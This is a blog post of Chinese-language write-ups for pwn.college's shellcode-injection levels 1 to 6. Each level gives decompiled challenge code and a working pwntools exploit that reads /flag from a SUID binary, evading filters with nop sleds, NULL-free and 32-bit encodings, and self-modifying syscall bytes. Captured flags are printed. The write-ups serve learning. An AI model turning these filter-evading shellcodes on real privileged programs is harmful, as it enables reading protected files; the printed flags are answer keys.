---
title: "Write-ups: Program Security (Shellcode Injection) series"
pubDate: 2024-12-24
categories: ["Pwn", "Write-ups", "Shellcode"]
description: "Write-ups for pwn.college binary exploitation series."
slug: shellcode-injection
---

## Table of contents

## Level 1

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag!

### Write-up

```plaintext showLineNumbers=false del={8}
pwndbg> checksec
File:     /home/cub3y0nd/Projects/pwn.college/babyshell-level-1
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

```c del={43, 50} collapse={1-39}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v10[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v11; // [rsp+1048h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v10;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v10);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-1.c", 0x69u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2565);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

够简单的吧，stack rwx，`((void (*)(void))shellcode)();` 把 `buf` 的地址强制转换为函数指针，执行我们的输入内容。

### Exploit

由于是 SUID 程序，以程序所有者权限运行。所以我们的思路是通过 `sendfile(0x1, open("/flag", 0x0, 0x0), 0x0, 0x1000)` 直接输出 `/flag` 的内容：

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{s4taPKpK1SzfB3gWK--PDuB4Xwx.01NxIDL5cTNxgzW}`

## Level 2

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.

### Write-up

```c ins={56-59} del={45, 65} collapse={1-41, 49-52}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  unsigned int v5; // eax
  int fd; // [rsp+28h] [rbp-1028h]
  int v9; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v12[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v13; // [rsp+1048h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v12;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v12);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-2.c", 0x69u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this");
  puts(
    "is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the");
  puts(
    "actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly");
  puts("execute and then your real shellcode will run. This concept is called a `nop sled`.\n");
  v5 = time(0LL);
  srand(v5);
  v9 = rand() % 1792 + 256;
  shellcode = (char *)shellcode + v9;
  shellcode_size -= v9;
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2735);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题在上一题的基础之上加了一个简单的限制：随机生成一个 `[0, 2048)` 之内的随机数，将 shellcode 地址设置为 `buf` 起始地址加上这个随机数。所以我们要避免把实际攻击代码放在 `[0, 2048)` 这个地址区间内，通过 `nop sled` 滑过这块区间就可以轻松绕过～

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-2"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(sled_length):
    nop = asm(shellcraft.nop())

    shellcode = nop * sled_length
    shellcode += asm(
        """
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload(0x7FF)

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{ws9aMHkG9tAyi31HLrmkc2LoE35.0FOxIDL5cTNxgzW}`

## Level 3

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

### Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2CE31000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)753078272 )
    __assert_fail("shellcode == (void *)0x2ce31000", "/challenge/babyshell-level-3.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2CE31000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-3.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no NULL bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( !*((_BYTE *)shellcode + k) )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这次的限制是 shellcode 的机器指令中不允许出现 `\x00` 字节。这就需要我们好好利用各自指令组合来构造数据了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-3"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rdi, 0x67616c66
    shl rdi, 0x8
    or rdi, 0x2f
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    or rax, 0x2
    syscall

    xor rdi, rdi
    or rdi, 0x1
    mov rsi, rax
    xor rdx, rdx
    xor r10, r10
    or r10, 0xfffffff
    xor rax, rax
    or rax, 0x28
    syscall

    dec rdi
    xor rax, rax
    or rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{gZQWA0hDKCz5Xn8KrcsIiwIX2aZ.0VOxIDL5cTNxgzW}`

## Level 4

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

### Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2D632000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)761470976 )
    __assert_fail("shellcode == (void *)0x2d632000", "/challenge/babyshell-level-4.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2D632000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-4.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no H bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( *((_BYTE *)shellcode + k) == 0x48 )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

显然，这次不允许我们使用 64-bit 汇编写 shellcode。Why？Cuz 64-bit 汇编指令本质上就是 32-bit 汇编的拓展，大多数指令都以前缀 `0x48` 开始。easy peasy!

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-4"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    lea ebx, [eip+0x2c]
    xor ecx, esi
    xor edx, edx
    mov eax, 0x5
    int 0x80

    mov ebx, 0x1
    mov ecx, eax
    xor edx, edx
    mov esi, 0x1000
    mov eax, 0xbb
    int 0x80

    mov ebx, 0x0
    mov eax, 0x1
    int 0x80

flag:
    .string "/flag"
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{wqf2fgp7CVvoI3yhbzzsqtw5OC3.0FMyIDL5cTNxgzW}`

## Level 5

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

### Write-up

```c ins={50-58} del={41, 63} collapse={1-37, 45-46}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x1A315000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)439439360 )
    __assert_fail("shellcode == (void *)0x1a315000", "/challenge/babyshell-level-5.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1A315000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-5.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2675);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

不让出现系统调用指令的机器码，绕过方法 very ez 啊，请看 exp。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-5"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rdi, 0x67616c662f
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04

    mov rdi, 0x1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x1000
    mov rax, 0x28
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04

    dec rdi
    mov rax, 0x3c
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{AJ-22D5IQdnex2KL8LxB8zOq02R.0VMyIDL5cTNxgzW}`

## Level 6

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

### Write-up

```c ins={50-58} del={41, 70} collapse={1-37, 45-46, 62-66}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x26E45000, 0x2000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)652496896 )
    __assert_fail("shellcode == (void *)0x26e45000", "/challenge/babyshell-level-6.c", 0x62u, "main");
  printf("Mapped 0x2000 bytes for shellcode at %p!\n", (const void *)0x26E45000);
  puts("Reading 0x2000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x2000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-6.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-6.c",
      0x79u,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
 puts(&byte_26ED);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

还是没难度。首先不允许出现系统调用指令的机器码，其次会在执行 shellcode 前移除前 `0x1000` 字节区块的写权限。由于我们的 shellcode 会去修改自生的指令来绕过不允许出现系统调用指令的机器码，所以肯定不能把 shellcoded 写在前 `0x1000` 字节的区块中，因为程序读了 `0x2000` 字节，所以我们把核心代码写到前 `0x1000` 字节之后即可。至于这前 `0x1000` 字节，我们一个 `nop` 滑铲滑过去就好了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-6"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(sled_length):
    nop = asm(shellcraft.nop())

    shellcode = nop * sled_length
    shellcode += asm(
        """
    mov rdi, 0x67616c662f
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04

    mov rdi, 0x1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x1000
    mov rax, 0x28
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04

    dec rdi
    mov rax, 0x3c
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload(0x1000)

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{kfVRmOzEaLCMSxdS_zQkxZr6BEv.0lMyIDL5cTNxgzW}`
